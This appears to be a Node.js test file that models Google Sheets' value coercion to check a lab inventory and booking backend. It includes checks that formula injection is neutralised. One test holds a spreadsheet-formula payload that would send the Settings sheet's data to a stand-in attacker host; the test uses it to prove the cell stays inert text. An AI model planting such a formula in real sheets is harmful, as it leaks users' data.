/**
 * The tests that only fail on a real spreadsheet.
 *
 *   node test-sheets-coercion.js
 *
 * test-storage-layer.js's in-memory sheet stores whatever JavaScript value it is
 * handed and gives the same one back. A real Google Sheet does not: it parses
 * what you write. "09:00" becomes a time and reads back as a Date on 1899-12-30;
 * "2026-08-18 09:00" becomes a datetime and reads back as a Date; "12345" becomes
 * a number; "TRUE" becomes a boolean. Every one of those round trips through a
 * type the code never sees while it is being tested.
 *
 * So this file wraps the same stub in a layer that coerces the way Sheets does,
 * and then asserts that the booking rules still hold. Two bugs lived here — daily
 * time windows silently becoming all-day, and every rule evaluated on a findRow()
 * row failing open — and neither was visible to the other two test files.
 */
// The backend reads dates on the local clock and the Apps Script project runs in
// America/New_York, so the tests have to as well — otherwise a booking fixture
// written as "2026-08-16 11:00" means a different instant on a laptop in Baltimore
// than on a CI box in UTC, and whether it counts as under way changes with it.
// Set before any Date is constructed; Node reads TZ once.
process.env.TZ = "America/New_York";

const fs = require("fs");
const vm = require("vm");

const REPO = __dirname;
const h = fs.readFileSync(REPO + "/test-storage-layer.js", "utf8");
const makeSheet = new Function("return " + h.match(/function makeSheet[\s\S]*?\n}\n/)[0].replace(/^function makeSheet/, "function"))();

// ─── What a real Sheet does to a value on the way in ─────────────────────────
const RE_TIME = /^(\d{1,2}):(\d{2})$/;
const RE_DATE = /^(\d{4})-(\d{2})-(\d{2})$/;
const RE_DTM  = /^(\d{4})-(\d{2})-(\d{2}) (\d{1,2}):(\d{2})$/;

// The backend runs inside a vm context whose Date is the frozen clock, so a Date
// built out here would fail `instanceof Date` in there for reasons that have
// nothing to do with Sheets. Build them with the context's own constructor.
const REALM = { Date: Date };

// Text that begins like a formula IS a formula to a spreadsheet, unless it was
// written with Sheets' own "this is text" mark. Both halves of that matter:
// the apostrophe is CONSUMED on the way in, so a cell holding literal "=A1" reads
// back as "=A1" with nothing to say it was ever guarded. Round-tripping a row
// through getValues()/setValues() therefore arms every formula it carries.
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const FORMULA_FIRED = "#FORMULA-EVALUATED";

// Deliberately wider than anything the backend enumerates. The point of a model is
// to be at least as eager as the thing it models: if a column is not marked as text,
// this should mangle it here, at the desk, rather than in the lab's spreadsheet.
const RE_MD   = /^\d{1,2}[-\/]\d{1,2}([-\/]\d{2,4})?$/;   // 3-14, 5/10, 9/1/2026
const RE_SCI  = /^[-+]?\d*\.?\d+[eE][-+]?\d+$/;           // 1E5
const RE_CUR  = /^[$£€¥]\s*[\d,]+(\.\d+)?$/;              // $14.99
const RE_THOU = /^\d{1,3}(,\d{3})+(\.\d+)?$/;             // 1,000
const RE_PCT  = /^-?\d+(\.\d+)?%$/;                       // 50%
const RE_12H  = /^\d{1,2}:\d{2}(:\d{2})?\s*[AaPp]\.?[Mm]\.?$/;  // 9:00 AM

function coerce(v) {
  if (typeof v !== "string") return v;
  // Marked as text: no parsing happens at all. The mark itself is eaten one layer
  // down, in makeSheet, which is where every stub models it — see that comment.
  if (v.charAt(0) === "'") return v;
  const D = REALM.Date;
  let m;
  if ((m = RE_DTM.exec(v)))  return new D(+m[1], +m[2] - 1, +m[3], +m[4], +m[5]);
  if ((m = RE_DATE.exec(v))) return new D(+m[1], +m[2] - 1, +m[3]);
  // A bare HH:MM is a time-of-day: Sheets stores it against the epoch it uses for
  // durations, 1899-12-30, which is why it reads back as a Date in the last century.
  if ((m = RE_TIME.exec(v)))  return new D(1899, 11, 30, +m[1], +m[2]);
  if (/^-?\d+(\.\d+)?$/.test(v)) return Number(v);
  if (v === "TRUE") return true;
  if (v === "FALSE") return false;
  if (FORMULA_LEAD.test(v)) return FORMULA_FIRED;   // unguarded: Sheets runs it
  // Everything below destroys the typed value. A shelf "3-14" becomes a date and
  // reads back "Sat Mar 14 2026 …"; "$14.99" loses its dollar sign; "1E5" becomes
  // 100000; "1,000" becomes 1000. All of these were live until text columns started
  // being marked as text.
  if (RE_MD.test(v))   { const p = v.split(/[-\/]/); return new D(p[2] ? (+p[2] < 100 ? 2000 + +p[2] : +p[2]) : 2026, +p[0] - 1, +p[1]); }
  if (RE_12H.test(v))  { const m2 = /^(\d{1,2}):(\d{2})/.exec(v); return new D(1899, 11, 30, +m2[1] + (/[Pp]/.test(v) && +m2[1] < 12 ? 12 : 0), +m2[2]); }
  if (RE_SCI.test(v))  return Number(v);
  if (RE_CUR.test(v))  return Number(v.replace(/[$£€¥,\s]/g, ""));
  if (RE_THOU.test(v)) return Number(v.replace(/,/g, ""));
  if (RE_PCT.test(v))  return Number(v.slice(0, -1)) / 100;
  return v;
}

// Wrap the plain stub so every write is parsed the way Sheets parses it.
function coercingSheet(name, rows) {
  const s = makeSheet(name, rows.map(r => r.map(coerce)));
  const realRange = s.getRange.bind(s);
  s.getRange = (...a) => {
    const r = realRange(...a);
    const sv = r.setValues.bind(r), s1 = r.setValue.bind(r);
    r.setValues = vals => sv(vals.map(row => row.map(coerce)));
    r.setValue  = v => s1(coerce(v));
    return r;
  };
  const realAppend = s.appendRow.bind(s);
  s.appendRow = row => realAppend(row.map(coerce));
  return s;
}

const NOW = new Date("2026-08-16T12:00:00Z");
class FrozenDate extends Date {
  constructor(...a) { if (a.length === 0) super(NOW.getTime()); else super(...a); }
  static now() { return NOW.getTime(); }
}

function build() {
  const sheets = { Sheet1: coercingSheet("Sheet1", []) };
  const ss = {
    __sheets: sheets, getId: () => "id", getSheets: () => Object.values(sheets),
    getSheetByName: n => sheets[n] || null,
    insertSheet(n) { sheets[n] = coercingSheet(n, []); return sheets[n]; },
    deleteSheet(s) { delete sheets[s.__name]; }, setActiveSheet: () => {},
  };
  const slack = [];
  const ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ss },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    UrlFetchApp: { fetch: (u, o) => { slack.push({ u, o }); return { getResponseCode: () => 200, getContentText: () => "ok" }; } },
    CacheService: { getScriptCache: () => ({ get: () => null, put() {} }) },
    ContentService: { MimeType: { JSON: "json", ICAL: "ical" }, createTextOutput: t => ({ __text: t, setMimeType(m) { this.__mime = m; return this; } }) },
    // A real one, not a placeholder: the calendar feed is almost entirely date
    // formatting, so a stub that returns "x" would assert nothing. Supports the two
    // patterns the backend actually asks for. TZ is pinned to America/New_York for
    // the whole file, so "local" here means what it means in Apps Script.
    Utilities: {
      base64DecodeWebSafe: s => Buffer.from(String(s), "base64"),
      // java.util.UUID.randomUUID() in Apps Script. A counter here, because a test
      // that cannot predict the token cannot assert on it — the property under test
      // is the shape and the uniqueness, not the entropy.
      getUuid: (() => { let n = 0; return () => {
        const h = (++n).toString(16).padStart(32, "0");
        return `${h.slice(0,8)}-${h.slice(8,12)}-${h.slice(12,16)}-${h.slice(16,20)}-${h.slice(20)}`;
      }; })(),

      formatDate: (d, tz, pattern) => {
        const p = n => String(n).padStart(2, "0");
        const utc = tz === "UTC";
        const Y = utc ? d.getUTCFullYear() : d.getFullYear();
        const M = p((utc ? d.getUTCMonth() : d.getMonth()) + 1);
        const D = p(utc ? d.getUTCDate() : d.getDate());
        const h = p(utc ? d.getUTCHours() : d.getHours());
        const m = p(utc ? d.getUTCMinutes() : d.getMinutes());
        const s2 = p(utc ? d.getUTCSeconds() : d.getSeconds());
        if (pattern === "yyyyMMdd") return `${Y}${M}${D}`;
        if (pattern === "yyyyMMdd'T'HHmmss'Z'") return `${Y}${M}${D}T${h}${m}${s2}Z`;
        throw new Error("test stub has no pattern: " + pattern);
      },
    },
    Session: { getScriptTimeZone: () => "America/New_York" },
    ScriptApp: { getService: () => ({ getUrl: () => "https://script.google.com/macros/s/AKtest/exec" }) },
    DriveApp: {}, Logger: { log() {} }, console: { log() {}, error() {} },
    JSON, Math, String, Number, Boolean, Array, Object, RegExp, Error, Date: FrozenDate, parseInt, parseFloat, isNaN,
  };
  ctx.globalThis = ctx;
  vm.createContext(ctx);
  REALM.Date = ctx.Date;   // sheets now hand back Dates the backend recognises
  vm.runInContext(fs.readFileSync(REPO + "/google-apps-script.js", "utf8"), ctx, { filename: "gas" });
  ctx.setupNewLab();
  const ADMIN = "admin@jh.edu", A = "alice@jh.edu", B = "bob@jh.edu";
  ctx.writeSetting("admins", JSON.stringify([ADMIN]));
  ctx.verifyToken = t => ({ admin: { email: ADMIN, name: "Admin" }, a: { email: A, name: "Alice" }, b: { email: B, name: "Bob" } })[t] || null;
  const post = (tok, action, extra) =>
    JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(Object.assign({ token: tok, action }, extra)) } }).__text);
  return { ctx, ss, slack, post, rows: n => ctx.readTable(n), ADMIN, A, B };
}

const item = (id, name, shared) => ({ id, name, cat: "Compute & Electronics", qty: 1, unit: "units", loc: "L",
  minQty: 0, img: "", desc: "", status: "Available", usedBy: [], serial: "", displayId: "", shared, consumable: false });
const book = (id, itemId, name, user, email, out, ret, from, to) => ({ id, itemId, item: name, user, out, ret,
  status: "Active", checkedOutByEmail: email, groupEmails: "", qty: 1, fromTime: from || "", toTime: to || "" });

let pass = 0, fail = 0;
const check = (l, c) => { if (c) { pass++; console.log("  ✓ " + l); } else { fail++; console.log("  ✗ " + l); } };

// ─── the stub really is coercing ─────────────────────────────────────────────
console.log("\nthe coercing stub behaves like a real Sheet");
{
  const { post, ss } = build();
  post("admin", "addItem", { item: item("i1", "Scope", true) });
  post("a", "addCheckout", { checkout: book("c1", "i1", "Scope", "Alice", "alice@jh.edu", "2026-08-18 09:00", "2026-08-20 17:00", "09:00", "12:00") });
  const hdr = ss.__sheets.Checkouts.__data[0], raw = ss.__sheets.Checkouts.__data[1];
  const cell = k => raw[hdr.indexOf(k)];
  check("out is stored as a Date, not a string", cell("out") instanceof Date);
  check("fromTime is stored as a Date, not a string", cell("fromTime") instanceof Date);
  check("shared is stored as a boolean", ss.__sheets.Items.__data[1][ss.__sheets.Items.__data[0].indexOf("shared")] === true);
}

// ─── reading a row back must give the rules something they can use ───────────
console.log("\nreadTable() normalizes what the sheet hands back");
{
  const { post, rows } = build();
  post("admin", "addItem", { item: item("i1", "Scope", true) });
  post("a", "addCheckout", { checkout: book("c1", "i1", "Scope", "Alice", "alice@jh.edu", "2026-08-18 09:00", "2026-08-20 17:00", "09:00", "12:00") });
  const c = rows("Checkouts")[0];
  check("out reads back as 'YYYY-MM-DD HH:MM'", c.out === "2026-08-18 09:00");
  check("ret reads back as 'YYYY-MM-DD HH:MM'", c.ret === "2026-08-20 17:00");
  check("fromTime reads back as 'HH:MM'", c.fromTime === "09:00");
  check("toTime reads back as 'HH:MM'",   c.toTime === "12:00");
}

console.log("\nfindRow() normalizes too — every rule that runs on one depends on it");
{
  const { ctx, post } = build();
  post("admin", "addItem", { item: item("i1", "Scope", true) });
  post("a", "addCheckout", { checkout: book("c1", "i1", "Scope", "Alice", "alice@jh.edu", "2026-08-18 09:00", "2026-08-20 17:00", "09:00", "12:00") });
  const c = ctx.findRow("Checkouts", "c1");
  check("findRow gives the same shape readTable does", c.out === "2026-08-18 09:00" && c.fromTime === "09:00");
  check("and the rules can read it", ctx.bookingMs_(c.out) !== null);
}

// ─── rule 1: a daily window has to survive the round trip ────────────────────
console.log("\nrule 1 — a daily window is still a window after it has been stored");
{
  const { post, rows } = build();
  post("admin", "addItem", { item: item("i1", "Scope", true) });
  post("a", "addCheckout", { checkout: book("c1", "i1", "Scope", "Alice", "alice@jh.edu", "2026-08-18 09:00", "2026-08-20 17:00", "09:00", "12:00") });
  const morning = post("b", "addCheckout", { checkout: book("c2", "i1", "Scope", "Bob", "bob@jh.edu", "2026-08-19 09:00", "2026-08-19 12:00", "10:00", "11:00") });
  check("another booking inside Alice's window is refused", !!morning.error);
  const afternoon = post("b", "addCheckout", { checkout: book("c3", "i1", "Scope", "Bob", "bob@jh.edu", "2026-08-19 13:00", "2026-08-19 16:00", "13:00", "16:00") });
  check("an afternoon booking outside it goes through", afternoon.ok && !afternoon.error);
  check("both rows are there", rows("Checkouts").filter(c => c.status === "Active").length === 2);
}

// ─── rule 3/4: the re-check on approval reads through findRow ────────────────
console.log("\nthe 'taken while this was waiting' re-check still fires");
{
  const { post, rows } = build();
  post("admin", "addItem", { item: item("i1", "Scope", true) });
  const q = post("a", "addCheckout", { checkout: book("c1", "i1", "Scope", "Alice", "alice@jh.edu", "2026-08-18 09:00", "2026-09-05 17:00") });
  check("Alice's three-week hold waits for an admin", q.pending === true && q.reason === "long");
  const grab = post("b", "addCheckout", { checkout: book("c2", "i1", "Scope", "Bob", "bob@jh.edu", "2026-08-20 09:00", "2026-08-21 17:00") });
  check("Bob queues behind her rather than jumping", grab.pending === true && grab.reason === "queue");
  post("admin", "decideCheckout", { checkoutId: "c2", approve: true });
  check("Bob's is approved and active", rows("Checkouts").find(c => c.id === "c2").status === "Active");
  const late = post("admin", "decideCheckout", { checkoutId: "c1", approve: true });
  check("approving Alice's is then refused — Bob has it", !!late.error);
  check("and hers stays pending rather than being handed out twice",
        rows("Checkouts").find(c => c.id === "c1").status === "Pending Approval");
}

// ─── editing a pending request also runs the rules off findRow ───────────────
console.log("\nediting a waiting request is judged on real values");
{
  const { post, rows } = build();
  post("admin", "addItem", { item: item("i1", "Scope", true) });
  post("a", "addCheckout", { checkout: book("c1", "i1", "Scope", "Alice", "alice@jh.edu", "2026-08-18 09:00", "2026-08-19 17:00", "09:00", "12:00") });
  const q = post("b", "addCheckout", { checkout: book("c2", "i1", "Scope", "Bob", "bob@jh.edu", "2026-08-20 09:00", "2026-09-10 17:00") });
  check("Bob's long hold waits", q.pending === true);
  const onto = post("b", "updateCheckout", { checkoutId: "c2", checkout: { out: "2026-08-18 09:00", ret: "2026-08-19 17:00", fromTime: "10:00", toTime: "11:00" } });
  check("moving it onto Alice's live slot is refused", !!onto.error);
  const clear = post("b", "updateCheckout", { checkoutId: "c2", checkout: { out: "2026-08-18 13:00", ret: "2026-08-19 16:00", fromTime: "13:00", toTime: "16:00" } });
  check("moving it to a free window is allowed", !clear.error);
  check("and shortening it below the limit hands the item over",
        rows("Checkouts").find(c => c.id === "c2").status === "Active");
}

// ─── text that a spreadsheet would rather run than show ──────────────────────
console.log("\ntext beginning with = + - or @ is stored as text, not run as a formula");
{
  const { post, ss, rows } = build();
  const evil = '=IMPORTXML("https://evil.example/?d="&JOIN(",",Settings!A1:B99),"//a")';
  post("a", "addItem", { item: item("i1", evil, false) });
  post("a", "addItem", { item: item("i2", "+1+1", false) });
  post("a", "addItem", { item: item("i3", "@SUM(A1:A9)", false) });
  const hdr = ss.__sheets.Items.__data[0], col = hdr.indexOf("name");
  const cells = ss.__sheets.Items.__data.slice(1).map(r => r[col]);
  check("nothing lands in a cell as a live formula", cells.every(c => c !== FORMULA_FIRED));
  const names = rows("Items").map(i => i.name);
  check("and the app still reads back exactly what was typed",
        names[0] === evil && names[1] === "+1+1" && names[2] === "@SUM(A1:A9)");
  // A leading apostrophe on ordinary text is somebody's data, not our marker.
  post("a", "addItem", { item: item("i4", "'tis a scope", false) });
  check("an ordinary apostrophe survives being written",
        rows("Items").find(i => i.id === "i4").name === "'tis a scope");

  // The bug this pair exists for: getValues() hands back a guarded cell as plain
  // text, so writing the row back armed everything it carried. Editing the qty
  // used to detonate the name.
  post("a", "updateItem", { item: { id: "i1", qty: 9 } });
  const after = rows("Items").find(i => i.id === "i1");
  check("editing another field does not arm the name", after.name === evil);
  check("and the edit still applied", after.qty === 9);
  const rawAfter = ss.__sheets.Items.__data.slice(1).map(r => r[col]);
  check("no cell evaluated after the round trip", rawAfter.every(c => c !== FORMULA_FIRED));
}

console.log("\ntext a spreadsheet would rather was a number, a date or a price");
{
  const { post, rows } = build();
  // Every one of these was destroyed on the way in, unrecoverably, until text
  // columns started being marked as text. They are not exotic — a shelf reference,
  // a price typed the way a person types one, a part number, a quantity with a
  // thousands separator.
  post("a", "addItem", { item: { id:"t1", name:"1E5 Resistor", cat:"Compute & Electronics",
    qty:1, unit:"units", loc:"3-14", minQty:0, img:"", desc:"", status:"Available",
    usedBy:[], serial:"0012345678", displayId:"CE-001", shared:false, consumable:false } });
  const it = rows("Items").find(i => i.id === "t1");
  check("a shelf written 3-14 is not March",   it.loc === "3-14");
  check("a part number in E notation survives", it.name === "1E5 Resistor");
  check("a serial keeps its leading zeros",     it.serial === "0012345678");

  post("a", "addOrder", { order: { id:"o1", store:"5/10 Supplies", item:"Cable, 1,000 ct",
    link:"https://x.example", qty:2, unit:"box", price:"$14.99", cat:"Compute & Electronics",
    requestedBy:"Alice", reason:"", urgency:"Normal", date:"2026-08-20", status:"Pending",
    requestedByEmail:"alice@jh.edu" } });
  const o = rows("Orders").find(x => x.id === "o1");
  check("a price keeps its dollar sign",        o.price === "$14.99");
  check("a store written 5/10 is not a date",   o.store === "5/10 Supplies");
  check("a thousands separator is not stripped", o.item === "Cable, 1,000 ct");
  check("urgency stays the word it was",        o.urgency === "Normal");

  // The sharp one: a price range parses as a date, and both the Copy Text total and
  // the Purchase Summary =SUM() strip non-digits out of whatever comes back.
  post("a", "addOrder", { order: { id:"o2", store:"S", item:"Widget", link:"", qty:1,
    unit:"ea", price:"10-15", cat:"Compute & Electronics", requestedBy:"Alice", reason:"",
    urgency:"Normal", date:"2026-08-20", status:"Pending", requestedByEmail:"alice@jh.edu" } });
  check("a price range is still a price range", rows("Orders").find(x => x.id === "o2").price === "10-15");
}

// The smoke test is the one thing that runs against the real spreadsheet, where
// nobody is watching it for regressions. Run it here too, against the model, so a
// typo in it surfaces at the desk rather than three months later in the editor.
console.log("\nthe real-sheet smoke test is itself exercised here");
{
  const { ctx, rows } = build();
  const report = ctx.smokeTest();
  check("smokeTest reports no failures", report.indexOf("FAIL") < 0);
  check("smokeTest cleans up after itself", rows("Items").length === 0 && rows("Checkouts").length === 0);
  if (report.indexOf("FAIL") >= 0) console.log(report.split("\n").filter(l => /FAIL|note/.test(l)).join("\n"));
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
